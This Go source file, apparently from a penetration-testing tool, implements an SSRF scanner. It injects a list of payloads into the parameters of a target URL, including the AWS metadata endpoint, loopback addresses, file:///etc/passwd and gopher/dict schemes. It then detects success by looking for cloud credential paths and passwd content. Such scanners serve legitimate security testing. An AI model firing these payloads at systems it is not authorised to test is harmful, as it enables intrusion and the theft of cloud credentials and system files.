package scanners

import (
	"strings"
	"time"

	"github.com/cc1a2b/PenHunter/types"
)

type SSRFScanner struct {
	*BaseScanner
	payloads []string
}

func NewSSRFScanner(encoders []string) *SSRFScanner {
	payloads := []string{
		"http://localhost:80",
		"http://127.0.0.1:80",
		"http://127.0.0.1:8080",
		"http://127.0.0.1:443",
		"http://169.254.169.254/latest/meta-data/",
		"http://[::]:80",
		"http://[::1]:80",
		"http://0.0.0.0:80",
		"file:///etc/passwd",
		"gopher://127.0.0.1:80",
		"dict://127.0.0.1:80",
		"ldap://127.0.0.1:80",
		"http://localhost/admin",
		"http://127.0.0.1/admin",
		"http://internal",
		"http://intranet",
	}

	return &SSRFScanner{
		BaseScanner: NewBaseScanner("SSRF", "high", encoders),
		payloads:    payloads,
	}
}

func (s *SSRFScanner) Payloads() []string {
	return s.payloads
}

// DetectSSRF checks for SSRF with baseline comparison to reduce false positives
func (s *SSRFScanner) DetectSSRF(resp *types.HttpResponse, baselineBody string, payload string) bool {
	body := string(resp.Body)

	// AWS Metadata specific indicators - these are strong SSRF indicators
	if strings.Contains(payload, "169.254.169.254") {
		awsIndicators := []string{
			"ami-id",
			"instance-id",
			"instance-type",
			"local-hostname",
			"local-ipv4",
			"public-hostname",
			"public-ipv4",
			"security-groups",
			"iam/security-credentials",
		}
		for _, indicator := range awsIndicators {
			if strings.Contains(body, indicator) && !strings.Contains(baselineBody, indicator) {
				return true
			}
		}
	}

	// Google Cloud metadata
	if strings.Contains(payload, "metadata.google") {
		gcpIndicators := []string{
			"computeMetadata",
			"project-id",
			"instance/zone",
			"instance/machine-type",
		}
		for _, indicator := range gcpIndicators {
			if strings.Contains(body, indicator) && !strings.Contains(baselineBody, indicator) {
				return true
			}
		}
	}

	// Internal service access - check for actual file/service content
	if strings.Contains(payload, "localhost") || strings.Contains(payload, "127.0.0.1") {
		// Check for /etc/passwd content (file:// SSRF)
		if strings.Contains(body, "root:x:0:0") && !strings.Contains(baselineBody, "root:x:0:0") {
			return true
		}
		// Check for internal admin panels
		adminIndicators := []string{
			"admin panel",
			"dashboard",
			"internal server",
			"tomcat",
			"apache status",
			"nginx status",
		}
		for _, indicator := range adminIndicators {
			if strings.Contains(strings.ToLower(body), indicator) && !strings.Contains(strings.ToLower(baselineBody), indicator) {
				// Additional check: response should be significantly different
				if len(body) > len(baselineBody)*2 || len(body) < len(baselineBody)/2 {
					return true
				}
			}
		}
	}

	return false
}

func (s *SSRFScanner) Detect(resp *types.HttpResponse) bool {
	body := string(resp.Body)

	// Only very strong indicators for fallback
	strongIndicators := []string{
		"ami-id",
		"instance-id",
		"computeMetadata",
		"root:x:0:0",
	}

	for _, indicator := range strongIndicators {
		if strings.Contains(body, indicator) {
			return true
		}
	}

	return false
}

func (s *SSRFScanner) Scan(targetURL string, client types.HttpClient) []*types.Finding {
	var findings []*types.Finding
	seenVulns := make(map[string]bool)

	if !s.hasParameter(targetURL) {
		return findings
	}

	params := s.extractParameters(targetURL)
	if len(params) == 0 {
		return findings
	}

	// Get baseline response for comparison
	baselineResp, _ := client.Get(targetURL, nil)
	baselineBody := ""
	if baselineResp != nil {
		baselineBody = string(baselineResp.Body)
	}

	for _, payload := range s.payloads {
		variants := s.mutatePayload(payload)

		for _, variant := range variants {
			for _, param := range params {
				parts := strings.SplitN(param, "=", 2)
				if len(parts) != 2 {
					continue
				}

				paramName := parts[0]

				// Skip if already found vuln for this param
				vulnKey := targetURL + "|" + paramName
				if seenVulns[vulnKey] {
					continue
				}

				injectedURL := s.injectPayload(targetURL, variant)

				resp, err := client.Get(injectedURL, nil)
				if err != nil {
					continue
				}

				// Use improved detection with baseline comparison
				if s.DetectSSRF(resp, baselineBody, variant) {
					evidence := s.extractEvidence(string(resp.Body), variant)
					confidence := 0.90

					finding := s.createFinding(
						injectedURL,
						paramName,
						variant,
						evidence,
						confidence,
						resp.StatusCode,
						string(resp.Body),
					)

					findings = append(findings, finding)
					seenVulns[vulnKey] = true
				}

				time.Sleep(50 * time.Millisecond)
			}
		}
	}

	return findings
}

func (s *SSRFScanner) extractEvidence(body, payload string) string {
	indicators := []string{
		"root:x:0:0",
		"127.0.0.1",
		"169.254.169.254",
		"instance-id",
		"ami-id",
	}

	for _, indicator := range indicators {
		if idx := strings.Index(body, indicator); idx != -1 {
			start := idx - 50
			if start < 0 {
				start = 0
			}
			end := idx + 200
			if end > len(body) {
				end = len(body)
			}
			return body[start:end]
		}
	}

	return "SSRF detected - internal resource accessed"
}

